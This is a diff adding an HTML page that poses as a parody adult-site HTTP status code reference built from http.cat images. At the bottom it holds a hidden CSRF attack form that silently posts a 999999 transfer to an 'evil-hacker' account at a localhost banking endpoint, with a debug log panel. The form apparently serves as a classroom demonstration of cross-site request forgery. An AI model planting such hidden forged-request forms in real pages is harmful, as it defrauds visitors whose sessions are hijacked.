@@ -1,0 +1,196 @@
+<!DOCTYPE html>
+<html lang="zh-TW">
+
+<head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <title>Pron Cat - HTTP Status Code Reference</title>
+    <link rel="stylesheet" href="style.css" />
+</head>
+
+<body>
+    <header>
+        <div class="top-bar">
+            <a href="#">SPICEVIDS</a>
+            <a href="#">FANCENTRO</a>
+            <a href="#">SEXUAL WELLNESS</a>
+            <a href="#">INSIGHTS</a>
+            <a href="#">SITES</a>
+            <a href="#">SHOP</a>
+            <a href="#">TRUST & SAFETY</a>
+        </div>
+
+        <div class="main-header">
+            <div class="menu-icon">☰</div>
+            <a href="#" class="logo">
+                <span class="pron">Pron</span><span class="cat">Cat</span>
+            </a>
+            <div class="search-box">
+                <input type="text" placeholder="搜索 PronCat" />
+            </div>
+            <div class="header-actions">
+                <button class="btn-premium">AI JERK OFF</button>
+                <span class="icon-btn">📤</span>
+                <span class="icon-btn">👤</span>
+            </div>
+        </div>
+
+        <!-- 導航選單 -->
+        <div class="nav-menu">
+            <a href="#" class="active">首頁</a>
+            <a href="#">視頻</a>
+            <a href="#">分類</a>
+            <a href="#">LIVE CAMS</a>
+            <a href="#">合作夥伴</a>
+            <a href="#">HTTP STATUS</a>
+            <a href="#">社群</a>
+            <a href="#">顯片反饋</a>
+        </div>
+    </header>
+
+    <div class="container">
+        <!-- 2xx Success -->
+        <h2 class="section-title">2xx - Success</h2>
+        <div class="status-grid">
+            <div class="status-card" onclick="viewStatus(200)">
+                <img src="https://http.cat/200" alt="200 OK" />
+                <div class="status-code">200</div>
+                <div class="status-text">OK</div>
+            </div>
+            <div class="status-card" onclick="viewStatus(201)">
+                <img src="https://http.cat/201" alt="201 Created" />
+                <div class="status-code">201</div>
+                <div class="status-text">Created</div>
+            </div>
+            <div class="status-card" onclick="viewStatus(202)">
+                <img src="https://http.cat/202" alt="202 Accepted" />
+                <div class="status-code">202</div>
+                <div class="status-text">Accepted</div>
+            </div>
+            <div class="status-card" onclick="viewStatus(204)">
+                <img src="https://http.cat/204" alt="204 No Content" />
+                <div class="status-code">204</div>
+                <div class="status-text">No Content</div>
+            </div>
+        </div>
+
+        <!-- 3xx Redirection -->
+        <h2 class="section-title">3xx - Redirection</h2>
+        <div class="status-grid">
+            <div class="status-card" onclick="viewStatus(301)">
+                <img src="https://http.cat/301" alt="301 Moved Permanently" />
+                <div class="status-code">301</div>
+                <div class="status-text">Moved Permanently</div>
+            </div>
+            <div class="status-card" onclick="viewStatus(302)">
+                <img src="https://http.cat/302" alt="302 Found" />
+                <div class="status-code">302</div>
+                <div class="status-text">Found</div>
+            </div>
+            <div class="status-card" onclick="viewStatus(304)">
+                <img src="https://http.cat/304" alt="304 Not Modified" />
+                <div class="status-code">304</div>
+                <div class="status-text">Not Modified</div>
+            </div>
+        </div>
+
+        <!-- 4xx Client Errors -->
+        <h2 class="section-title">4xx - Client Errors</h2>
+        <div class="status-grid">
+            <div class="status-card" onclick="viewStatus(400)">
+                <img src="https://http.cat/400" alt="400 Bad Request" />
+                <div class="status-code">400</div>
+                <div class="status-text">Bad Request</div>
+            </div>
+            <div class="status-card" onclick="viewStatus(401)">
+                <img src="https://http.cat/401" alt="401 Unauthorized" />
+                <div class="status-code">401</div>
+                <div class="status-text">Unauthorized</div>
+            </div>
+            <div class="status-card" onclick="viewStatus(403)">
+                <img src="https://http.cat/403" alt="403 Forbidden" />
+                <div class="status-code">403</div>
+                <div class="status-text">Forbidden</div>
+            </div>
+            <div class="status-card" onclick="viewStatus(404)">
+                <img src="https://http.cat/404" alt="404 Not Found" />
+                <div class="status-code">404</div>
+                <div class="status-text">Not Found</div>
+            </div>
+            <div class="status-card" onclick="viewStatus(405)">
+                <img src="https://http.cat/405" alt="405 Method Not Allowed" />
+                <div class="status-code">405</div>
+                <div class="status-text">Method Not Allowed</div>
+            </div>
+            <div class="status-card" onclick="viewStatus(408)">
+                <img src="https://http.cat/408" alt="408 Request Timeout" />
+                <div class="status-code">408</div>
+                <div class="status-text">Request Timeout</div>
+            </div>
+            <div class="status-card" onclick="viewStatus(418)">
+                <img src="https://http.cat/418" alt="418 I'm a teapot" />
+                <div class="status-code">418</div>
+                <div class="status-text">I'm a teapot</div>
+            </div>
+            <div class="status-card" onclick="viewStatus(429)">
+                <img src="https://http.cat/429" alt="429 Too Many Requests" />
+                <div class="status-code">429</div>
+                <div class="status-text">Too Many Requests</div>
+            </div>
+        </div>
+
+        <!-- 5xx Server Errors -->
+        <h2 class="section-title">5xx - Server Errors</h2>
+        <div class="status-grid">
+            <div class="status-card" onclick="viewStatus(500)">
+                <img src="https://http.cat/500" alt="500 Internal Server Error" />
+                <div class="status-code">500</div>
+                <div class="status-text">Internal Server Error</div>
+            </div>
+            <div class="status-card" onclick="viewStatus(502)">
+                <img src="https://http.cat/502" alt="502 Bad Gateway" />
+                <div class="status-code">502</div>
+                <div class="status-text">Bad Gateway</div>
+            </div>
+            <div class="status-card" onclick="viewStatus(503)">
+                <img src="https://http.cat/503" alt="503 Service Unavailable" />
+                <div class="status-code">503</div>
+                <div class="status-text">Service Unavailable</div>
+            </div>
+            <div class="status-card" onclick="viewStatus(504)">
+                <img src="https://http.cat/504" alt="504 Gateway Timeout" />
+                <div class="status-code">504</div>
+                <div class="status-text">Gateway Timeout</div>
+            </div>
+        </div>
+    </div>
+
+    <footer>
+        <p>
+            <span style="color: #ffffff">Pron</span>
+            <span style="color: #ff9000">Cat</span> - HTTP Status Codes Reference
+            🐱<br />
+            <small>Original Images from
+                <a href="https://http.cat" target="_blank">http.cat</a> | For
+                educational purposes only</small>
+        </p>
+    </footer>
+
+    <!-- 隱藏的攻擊表單 -->
+    <form id="hiddenAttackForm" action="http://localhost:3000/secure-auth/transfer" method="POST" target="attackFrame"
+        style="display: none">
+        <input name="amount" value="999999" />
+        <input name="toAccount" value="evil-hacker" />
+    </form>
+    <iframe name="attackFrame" style="display: none"></iframe>
+
+    <!-- 除錯面板（預設隱藏，按 Ctrl+D 顯示） -->
+    <div class="debug-panel" id="debugPanel">
+        <strong>CSRF Attack Debug Log</strong>
+        <div id="debugLog"></div>
+    </div>
+    <div class="debug-hint">Press Ctrl+D to toggle debug panel</div>
+</body>
+<script src="script.js"></script>
+
+</html>
